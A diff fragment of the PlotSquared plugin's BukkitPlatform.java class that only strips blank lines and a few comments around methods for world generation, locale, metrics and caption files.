@@ -1470,17 +1291,14 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         metrics.addCustomChart(new SimplePie("offline_mode", () -> Settings.UUID.OFFLINE ? "true" : "false"));
         metrics.addCustomChart(new SimplePie("offline_mode_force", () -> Settings.UUID.FORCE_LOWERCASE ? "true" : "false"));
     }
-
     @Override
     public void unregister(final @NonNull PlotPlayer<?> player) {
         PlotSquared.platform().playerManager().removePlayer(player.getUUID());
     }
-
     @Override
     public void setGenerator(final @NonNull String worldName) {
         World world = BukkitUtil.getWorld(worldName);
         if (world == null) {
-            // create world
             ConfigurationSection worldConfig = this.worldConfiguration.getConfigurationSection("worlds." + worldName);
             String manager = worldConfig.getString("generator.plugin", pluginName());
             PlotAreaBuilder builder =
@@ -1514,13 +1332,11 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             PlotSquared.get().loadWorld(worldName, null);
         }
     }
-
     @Override
     public @NonNull String serverNativePackage() {
         final String name = Bukkit.getServer().getClass().getPackage().getName();
         return name.substring(name.lastIndexOf('.') + 1);
     }
-
     @Override
     public @NonNull GeneratorWrapper<?> wrapPlotGenerator(
             final @NonNull String world,
@@ -1528,8 +1344,7 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
     ) {
         return new BukkitPlotGenerator(world, generator, this.plotAreaManager);
     }
-
-    @SuppressWarnings("deprecation") // Paper deprecation
+    @SuppressWarnings("deprecation")
     @Override
     public @NonNull String pluginsFormatted() {
         StringBuilder msg = new StringBuilder();
@@ -1560,9 +1375,8 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         }
         return msg.toString();
     }
-
     @Override
-    @SuppressWarnings({"ConstantConditions", "deprecation"}) // Paper deprecation
+    @SuppressWarnings({"ConstantConditions", "deprecation"})
     public @NonNull String worldEditImplementations() {
         StringBuilder msg = new StringBuilder();
         if (Bukkit.getPluginManager().getPlugin("FastAsyncWorldEdit") != null) {
@@ -1583,61 +1397,49 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         }
         return msg.toString();
     }
-
     @Override
     public com.plotsquared.core.location.@NonNull World<?> getPlatformWorld(final @NonNull String worldName) {
         return BukkitWorld.of(worldName);
     }
-
     @Override
     public @NonNull Audience consoleAudience() {
         return BukkitUtil.BUKKIT_AUDIENCES.console();
     }
-
     @Override
     public @NonNull String pluginName() {
         return this.pluginName;
     }
-
     public SingleWorldListener getSingleWorldListener() {
         return this.singleWorldListener;
     }
-
     @Override
     public @NonNull Injector injector() {
         return this.injector;
     }
-
     @Override
     public @NonNull PlotAreaManager plotAreaManager() {
         return this.plotAreaManager;
     }
-
     @NonNull
     @Override
     public Locale getLocale() {
         return this.serverLocale;
     }
-
     @Override
     public void setLocale(final @NonNull Locale locale) {
         throw new UnsupportedOperationException("Cannot replace server locale");
     }
-
     @Override
     public @NonNull PlatformWorldManager<?> worldManager() {
         return this.worldManager;
     }
-
     @Override
     @NonNull
     public PlayerManager<? extends PlotPlayer<Player>, ? extends Player> playerManager() {
         return this.playerManager;
     }
-
     @Override
     public void copyCaptionMaps() {
-        /* Make this prettier at some point */
         final String[] languages = new String[]{"en"};
         for (final String language : languages) {
             if (!new File(new File(this.getDataFolder(), "lang"), String.format("messages_%s.json", language)).exists()) {
@@ -1646,16 +1448,13 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
             }
         }
     }
-
     @NonNull
     @Override
     public String toLegacyPlatformString(final @NonNull Component component) {
         return LegacyComponentSerializer.legacyAmpersand().serialize(component);
     }
-
     @Override
     public boolean isFaweHooking() {
         return faweHook;
     }
-
 }
